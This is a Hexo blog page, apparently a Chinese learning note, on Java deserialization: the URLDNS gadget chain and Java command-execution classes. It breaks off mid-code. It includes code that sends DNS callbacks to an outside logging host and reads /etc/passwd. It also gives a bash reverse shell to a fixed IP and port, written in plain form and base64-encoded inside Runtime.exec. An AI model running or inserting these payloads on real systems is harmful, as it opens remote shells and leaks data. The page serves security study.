@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Octopus">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/05/java反序列化学习记录-cc1-cc6/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化学习记录 - CC1 &amp;&amp; CC6">
+<meta property="og:url" content="http://example.com/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-03-05T12:12:50.000Z">
+<meta property="article:modified_time" content="2025-03-05T12:24:09.901Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/alphabet.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/alphabet.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/alphabet.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Java反序列化学习记录 - CC1 &amp;&amp; CC6 | OctSec
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/121.jpg","dark":"/images/dark.jpg"},"title":"DaZhangYu","subtitle":{"text":["In the things I adore, discipline  finds its way.","Can you still hold on?"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"归档":{"path":"/archives","icon":"fa-regular fa-archive"},"分类":{"path":"/categories/","icon":"fa-regular fa-folder"},"友链":{"icon":"fa-regular fa-link","path":"/links/"},"关于":{"path":"/about/","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"初涉安全，请多指教","show_on_mobile":true,"links":{"标签":{"path":"/tags","icon":"fa-regular fa-tags"},"分类":{"path":"/categories","icon":"fa-regular fa-folder"},"工具":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/3/14 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                OctSec
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友链
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                友链
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>标签</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/bookmarks/"
+                        >
+                            <span>工具</span>
+                            <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/images/15.jpg" alt="Java反序列化学习记录 - CC1 &amp;&amp; CC6" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Java反序列化学习记录 - CC1 &amp;&amp; CC6</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/octopus3.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Octopus</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-05 20:12:50</span>
+        <span class="mobile">2025-03-05 20:12:50</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-05 20:24:09</span>
+            <span class="mobile">2025-03-05 20:24:09</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/">Java安全审计</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h2><p>URLDNS 是 Java 反序列化漏洞中的一种，利用了 Java 在反序列化过程中可以解析 URL，并且在请求期间利用 DNS 反向解析来泄露信息。</p>
+<p>URLDNS 核心是 java.net.URL 类</p>
+<p><strong>URLDNS 链示例</strong></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116214614913.png" class title="image-20250116214614913">
+
+<p>首先当进行 URL 组合 hashCode() 代码执行时，底层代码会执行到 URLStreamHander 类的 getHostAddress 方法，达到触发 DNSLOG 请求的效果，如</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        URL url = new URL(&quot;http://92twaa.ceye.io&quot;);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>DNS 网站成功接收到了请求信息</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116213610468.png" class title="image-20250116213610468">
+
+<p>假设不能直接调用 hashCode，这时就需要通过其他多个类组合，最终触发某个类内部的 hashCode，搭配出 URLDNS 链</p>
+<p>在 HashMap 类的 readObject 方法中，会执行 hash(key)</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116215234708.png" class title="image-20250116215234708">
+
+<p>继续跟进 hash 方法，内部会执行 hashCode</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116215316992.png" class title="image-20250116215316992">
+
+<p>完整 URLDNS 链</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        URL url = new URL(&quot;http://92twaa.ceye.io&quot;);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        setFieldValue(url, &quot;hashCode&quot;, 888);</span><br><span class="line">        //调用了 setFieldValue 方法，通过反射修改了 URL 对象的私有字段 hashCode，将其值设为 888，避免在 hashMap.put 的时候触发DNS解析</span><br><span class="line">        hashMap.put(url, &quot;useless&quot;);</span><br><span class="line">        setFieldValue(url, &quot;hashCode&quot;, -1);</span><br><span class="line">        byte[] poc = serialize(hashMap);</span><br><span class="line">        unserialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        baos.close();</span><br><span class="line">        oos.close();</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void unserialize(byte[] poc) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        bais.close();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        System.out.println(field);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Runtime-类"><a href="#Runtime-类" class="headerlink" title="Runtime 类"></a>Runtime 类</h3><p>获取命令执行输出结果</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InputStream is = Runtime.getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        int len = 0;</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        while ((len = is.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>Linux 无法重定向</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String a = &quot;echo 123 &gt; 1.txt&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果命令是一个字符串，那么 Java 会后面的 123 &gt; 1.txt 视为一个字符串去 echo，这样代码就不是预期效果</p>
+<p><strong>解决方案一</strong></p>
+<p>数组传参</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120160632304.png" class title="image-20250120160632304">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmd = new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo 123 &gt; /1.txt&quot;&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>方案二</strong></p>
+<p>Base64</p>
+<p>&#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;60.204.244.254&#x2F;7788 0&gt;&amp;1’</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String cmd = &quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzYwLjIwNC4yNDQuMjU0Lzc3ODggMD4mMSc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="ProcessBuilder-类"><a href="#ProcessBuilder-类" class="headerlink" title="ProcessBuilder 类"></a>ProcessBuilder 类</h3><p>用法如下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InputStream inputStream = new ProcessBuilder(&quot;whoami&quot;).start().getInputStream();</span><br><span class="line">        byte[] cache = new byte[1024];</span><br><span class="line">        int len = 0;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        while ((len = inputStream.read(cache)) != -1) &#123;</span><br><span class="line">            baos.write(cache, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Runtime 内部也是通过 ProcessBuilder </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250120175818890.png" class title="image-20250120175818890">
+
+<h3 id="Processlmpl-类"><a href="#Processlmpl-类" class="headerlink" title="Processlmpl 类"></a>Processlmpl 类</h3><p>用法</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.l202519;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Main_ &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;whoami&quot;&#125;;</span><br><span class="line">        Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Process e = (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, 